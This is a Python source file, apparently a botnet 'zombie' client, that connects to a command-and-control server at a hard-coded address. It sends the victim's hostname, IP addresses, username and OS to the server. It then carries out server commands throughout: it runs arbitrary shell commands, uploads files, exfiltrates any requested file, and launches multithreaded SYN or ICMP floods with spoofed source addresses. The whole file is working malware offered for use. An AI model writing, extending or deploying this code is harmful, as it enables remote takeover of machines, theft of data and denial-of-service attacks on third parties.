import socket
import requests
import subprocess
import random
import time
from scapy.layers.inet import TCP, ICMP, IP
from scapy.sendrecv import send
from scapy.all import *
import platform
import os
import json
import threading

def get_zombie_details() :
    details = {
        "pc_name" : socket.gethostname(),
        "private_ip" : socket.gethostbyname(socket.gethostname()),
        "public_ip" : requests.get("https://httpbin.org/ip").json()["origin"],
        "username" : os.getlogin(),
        "os" : platform.system()
    }
    print(details)
    return details

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def send_packet(target_ip, target_port, packet_size, attack_mode):
    try:
        source_ip = generate_random_ip()
        source_port = RandShort()

        payload = Raw(RandString(size=packet_size))

        if attack_mode == "syn":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / payload
        elif attack_mode == "icmp":
            packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload 
        send(packet, verbose=False)
    except Exception as e:
        print(f"Error while sending packet: {e}")

ip_address = '192.168.13.228'
port_number = 50000

# Create a TCP/IP socket of type stream and IPV4 (because of AF_INET)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
client_socket.connect((ip_address, port_number))

print("Connected to server...")

server_ready = client_socket.recv(1024).decode()
if server_ready == "ready":
    print("Server is ready to receive data...")
    # Send the details of the zombie to the server
    print("Sending zombie details to server...")
    client_socket.sendall(json.dumps(get_zombie_details()).encode())
    print("Zombie details sent to server...")

    while True:
        print("Waiting for command from server...")
        command_to_execute = client_socket.recv(1024).decode()
        print(f"Received command from server: {command_to_execute}")

        if command_to_execute == "quit":
            break
        
        elif command_to_execute.split(" ")[0] == "upload":
            filename = os.path.basename(command_to_execute.split(" ")[1])
            file_size = int(command_to_execute.split(" ")[2])
            upload_path = ""
            if platform.system().lower() == "windows":
                upload_path = fr"C:\Users\AppData\Local\Temp\{filename}" # to fix
            else:
                upload_path = f"/tmp/{filename}"

            with open(upload_path, "wb") as f:
                client_socket.send("ready".encode())
                data = client_socket.recv(file_size)
                f.write(data)
            client_socket.send("File uploaded successfully.".encode())

        elif command_to_execute.split(" ")[0] == "download":
            file_path = command_to_execute.split(" ")[1]

            with open(file_path, "rb") as f:
                client_socket.send(f.read())
        
        elif command_to_execute.split(" ")[0] == "ddos":
            counter_lock = threading.Lock()
            sent_packets = 0
            stop_threads = False

            command_ls = command_to_execute.split(" ")
            attack_mode = command_ls[1]
            target_ip = command_ls[2]
            target_port = int(command_ls[3])
            number_of_packets = int(command_ls[4])
            packet_size = int(command_ls[5])
            number_of_threads = int(command_ls[6])
            attack_duration = int(command_ls[7])
            attack_rate = int(command_ls[8])

            start_time = time.time()
            delay = 1 / attack_rate

            def send_packets():
                global sent_packets
                while not stop_threads and time.time() - start_time < attack_duration:

                    with counter_lock:
                        if sent_packets >= number_of_packets:
                            break
                        sent_packets += 1
                    
                    send_packet(target_ip, target_port, packet_size, attack_mode)
                    
                    # Wait based on rate limiter
                    time.sleep(delay)

                    print(f"\rSent packet {sent_packets}", end="")

            threads = []
            try:
                for i in range(number_of_threads):
                    t = threading.Thread(target=send_packets)
                    threads.append(t)
                    t.start()
                for t in threads:
                    t.join()
            except KeyboardInterrupt:
                print("\nAttack stopped by user.")
                stop_threads = True
                for t in threads:
                    t.join()
            except Exception as e:
                print(f"Error during attack: {e}")
            finally:
                print("\nAttack completed")
        else:
            output, error = subprocess.Popen(command_to_execute, 
                                            shell=True, 
                                            stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE
                                            ).communicate()
            
            if command_to_execute.startswith("ping"):
                upload_path = ""
                if platform.system().lower() == "windows":
                    upload_path = fr"C:\Users\AppData\Local\Temp\{filename}" # to fix
                else:
                    upload_path = f"/tmp/{filename}"

                with open(upload_path, "r") as f:                    
                    output = f.read().encode()

            if output:
                client_socket.sendall(output)
            else:
                client_socket.sendall(error)
        print("Command output sent to server...")

# Close the socket
client_socket.close()